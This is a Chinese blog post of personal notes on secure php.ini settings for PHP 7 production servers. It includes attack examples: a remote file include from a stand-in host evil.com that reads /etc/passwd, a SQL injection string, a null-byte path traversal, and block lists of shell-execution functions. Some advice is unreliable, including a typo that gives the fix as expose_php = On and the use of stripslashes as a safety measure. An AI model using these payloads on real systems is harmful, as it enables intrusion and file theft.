---
title: PHP 安全相关的配置
tags:
  - php配置
  - web安全
comments: true
abbrlink: 31181
categories:
  - 其他
  - web安全
date: 2019-06-04 23:23:57
---

## 背景

最近在整理这几年做的笔记,关于web安全的内容不多,做了太多垃圾外包,几乎从来没考虑过什么安全,唯一一次还是做一个政府小项目为了应对安全扫描软件的扫描,随便应付了一下,唯一做了一点点笔记也是在那个时候,所以在这边特意做一个笔记.

首先这边先记录一些关于php配置的安全知识.大部分来源于网络总结,算是做了一些整理吧.

在整理资料的时候发现网上很多都是古老的文章,已经不适用了,如果想深入研究和测试,可以直接看官方文档,[php.ini配置](https://www.php.net/manual/zh/ini.php)

下面是我总结的一些配置,也筛选出了php7已经没有的配置

***

## 列举

### php7 生产环境需要修改的配置

***

#### expose_php = Off

我们经常会在一个http header头里发现这样的信息：

> X-Powered-By:PHP/5.2.11

PHP的版本号暴露无疑，攻击者很容易捕获到此信息，要想解决此问题我们只要如下配置

expose_php = On

该配置项默认为On，需要修改为Off。

P.s

这个配置可以通过自定义header头,覆盖掉

比如写个中间件``header("X-Powered-By: Young");``

> 附带 隐藏server信息的方式
>
> ---
>
> nginx 隐藏 server
>
> 修改nginx.conf  在http里面设置
>
> server_tokens off;
>
> apache 隐藏 server
>
> 修改httpd.conf 设置
>
> ServerSignature Off
>
> ServerTokens Prod

#### display_errors = Off

此控制项控制PHP是否将error、notice、warning日志打印出来，以及打印的位置。错误信息主要用于辅助开发，但是在线上环境却非常危险，因为这样将会把服务端的WebServer、数据库、PHP代码部署路径，甚至是数据库连接、数据表等关键信息暴露出去，为攻击者带来极大便利。所以建议产品上线时修改为Off。

#### error_reporting = E_ALL& ~E_NOTICE

此配置项控制PHP打印哪些错误日志（errors，warnings，notices）。默认情况下会打印所有的错误日志，线上环境我们应该不显示具体的E_NOTICE日志信息。

导致E_NOTICE错误的最普遍场景是——使用未经初始化的变量，以下述代码为例：

```php
<?php
 // 假如用户请求中无username 参数，则会打印notice错误
    // 假如用户请求中无username 参数，则会打印notice错误
    $username = $_GET[‘username’];
    // 引用一个未初始化的变量var2
    //  则会打印notice错误
    $var1   = $var2;

?>

```

如果用户访问的url中没有指定username参数，则代码中$_GET[‘username’]就是一个未经初始化的变量，直接访问就会抛出一个NOTICE错误。上述代码执行会报如下错误,这样即泄漏了代码目录。

PHP Notice: Undefined index: username in /somepath/test.php on line 3

PHP Notice: Undefined variable: var2 in /somepath/test.php on line 6

攻击者会利用这些信息，猜测代码逻辑，使得攻击变得更方便。

#### display_startup_errors =Off

php启动时产生的错误由此选项进行控制，这个和display_errors是分开的。为了避免PHP进城启动时产生的错误被打印到页面上而造成信息泄漏，此选项在线上服务也应该被配置为Off。

为了方便开发和调试，开发环境可以将其设置为On。

由此我们可以看出，正确的PHP基础安全配置可有效避免很多高危漏洞，避免泄漏服务器敏感信息，从而提升产品的安全性。

#### 控制php脚本能访问的目录

使用open_basedir选项能够控制PHP脚本只能访问指定的目录，

这样能够避免PHP脚本访问不应该访问的文件，一定程度上限制了phpshell的危害，

我们一般可以设置为只能访问网站目录：

```php
open_basedir = D:/usr/www
```

#### 关闭危险函数

如果打开了安全模式，那么函数禁止是可以不需要的，但是我们为了安全还是考虑进去。

比如，我们觉得不希望执行包括system()等在那的能够执行命令的php函数，

或者能够查看php信息的phpinfo()等函数，那么我们就可以禁止它们：

```php
disable_functions = system,passthru,exec,shell_exec,popen,phpinfo,escapeshellarg,escapeshellcmd,proc_close,proc_open,dl,show_source,get_cfg_var
```

如果你要禁止任何文件和目录的操作，那么可以关闭很多文件操作：

```php
disable_functions = chdir,chroot,dir,getcwd,opendir,readdir,scandir,fopen,unlink,delete,copy,mkdir,rmdir,rename,file,file_get_contents,fputs,fwrite,chgrp,chmod,chown
```

以上只是列了部分不叫常用的文件处理函数，你也可以把上面执行命令函数和这个函数结合，就能够抵制大部分的phpshell了。

### php7 无需修改的配置

***

#### allow_url_include =Off

PHP通过此选项控制是否允许通过include/require来执行一个远程文件(如<http://evil.com/evil.php或ftp://evil.com/evil.php>)。

代码示例如下：

```php
// http://HostA/test.php如下：
<?php
$strParam = $_GET['param'];
if (!include_once($strParam.’.php’)){
   echo “error”;
}
?>
// http://evil.com/evil.php示例如下：
<?php 
   echo "<?php system('cat/etc/passwd'); ?>"
?>  

```

假如用户访问如下的URL，访问页面中的$strParam将被设置为一个远程的URL：<http://evil.com/evil.php。如果此配置被设置为on，那么test.php会通过include_once执行远程服务器上的PHP文件（http://evil.com/evil.php>），后果不言而喻。

   <http://HostA/test.php?param=http://evil.com/evil>

所以建议此选项强制配置为Off。

当然要彻底解决上述代码的安全漏洞，除了规范PHP配置，还需要规范PHP编码。

### php7 已经废弃的配置

***

#### register_globals = Off

PHP在进程启动时，会根据**register_globals**的设置，判断是否将$_GET、$_POST、$_COOKIE、$_ENV、$_SERVER、$REQUEST等数组变量里的内容自动注册为全局变量。

我们举个例子来说明**register_globals = On**时，会引发的安全问题：

```php+HTML
<form action='' method='get'>
    <input type='text' name='username' value='alex' >
    <input type='submit' name='sub' value='sub'>
</form>
<?php
    echo 'username::',$username;
    echo '<br>sub::',$sub;
    echo '<br>GET::';
    print_r($_GET);
?>

```

当register_globals = On的时候，程序运行提交输出结果为：

```
    username::alex  
    sub::sub  
    array ( [username] => alex [sub] => sub )   
```

当register_globals = Off的时候，程序运行提交输出结果为：

```
    username::  
    sub::  
    array ( [username] => alex [sub] => sub )   
```

**从 PHP 5.3.0 起不推荐使用。 在 PHP 5.4.0 中移除该选项**

#### magic_quotes_gpc = on

举一个典型的SQL注入示例，假如SQL语句用如下方式拼接：

select * from user where pass=’ “. $_GET[‘passwd’]. ”' and user='” . $_GET[‘username’] .”';

假如用户提交一个login.php?passwd=p&username=’ or ‘1’=’1请求，代码中的SQL语句将变成：

![img](https://nos.netease.com/is-center/KqcSKGgYoCc2FTtPiNdwqyrJlMZClkFnD1AGMtD51364871603969.png)

这就造成一个SQL注入漏洞。避免此问题出现的正确思路是开发者在拼接SQL语句之前过滤所有接收的数值，并严格执行这种编码规范，但是并不是所有的开发者都会意识到这种问题的存在，而此时，如果将php.ini的magic_quotes_gpc设置为On时，PHP将对所有GPC参数($_GET,$_POST,$_COOKIE)进行addslashes处理[既转义单引号、双引号、反斜线和nullbyte]，该SQL语句将是：

![img](https://nos.netease.com/is-center/bKaVqItWi8yRCgSGY9CiuvemcafoVW32RafZoYxz1364871616951.png)

由于’已经被转义，SQL语句不能被成功执行，从而防止SQL注射。

另外，以小节2中的<http://HostA/test.php为例，当magic_quotes_gpc>= Off的情况下，用户提交一个example.php?param=../../../etc/passwd%00请求，由于代码中限制的文件后缀（.php）将被%00截断，就会通过require_once尝试读取/etc/passwd文件。

值得注意的是，magic_quotes_gpc配置为On时，有以下缺点：

1、     php此时会对所有GPC参数做addslashes处理，会有比较大的性能损耗。

2、     当GPC参数被用于其他操作如逻辑关系判断之前就必须先做strislashes处理，否则结果必然是不正确的。

考虑到开启此选项带来的性能损耗和代码的复杂化，可以在使用时灵活设置，对于一些不规范或者无人维护的代码，可以开启此选项；更好的做法是将此值设置为Off，由开发者严格过滤来自用户的输入。

以下补充摘自 [PHP6、PHP7关闭magic_quotes_gpc对程序的影响](http://www.auiou.com/relevant/00001281.jsp)

在PHP5及之前，magic_quotes_gpc默认是开启的。magic_quotes_gpc的作用很微妙，我一直使用PHP5多年，magic_quotes_gpc呈开启状态，

平时没有受到任何影响

。直到发现PHP的Cookies，

如果有'这样的标点符号，在Cookies里，会将这些符号全部转义为\'

。查阅了大量的资料，解决的办法是将php.ini的magic_quotes_gpc设置为Off，或者不改变php.ini，在.htaccess里将magic_quotes_gpc设置为Off，方法是在.htaccess里写入：

php_value magic_quotes_gpc Off

PHP6、PHP7的php.ini里没有magic_quotes_gpc的选项，实际呈关闭状态。magic_quotes_gpc关闭之后，为了加强安全，原来所有的$_POST['abc']和$_GET['abc']最好全部加上stripslashes()来转义，例如：
$aa=stripslashes($_POST['abc']);
$aa=stripslashes($_GET['abc']);

PHP关闭magic_quotes_gpc之后，**有一个很特殊的影响**。比如在post表单里，如果<form method=post>发送的信息里恰好有反斜杠符\，**如果是用stripslashes($_POST['abc'])来接收，反斜杠符会被全部删除**。例如在重要的项目里，提交的内容为：W:\ac3\about，接收到的内容变为：W:ac3about。
(这个影响，有可能在本机的PHP下会删除反斜杠，有些服务器不会删除。)

经过测试，解决的办法是，这时去掉stripslashes，反斜杠符就不会被替换掉，例如：
$aa=$_POST['abc'];

但这样会带来不安全，解决的办法是把提交的信息里的<符转成&lt;，例如：
$aa=str_replace('<','&lt;',$aa);

经过测试，如果<form method=get>发送的信息里有反斜杠符\，用$aa=stripslashes($_GET['abc'])接收，**反斜杠符不受影响，不会被删除**。

**P.s 总结php接收参数最安全的做法就是全部转义**

## 参考

<https://www.php.net/manual/zh/ini.php>
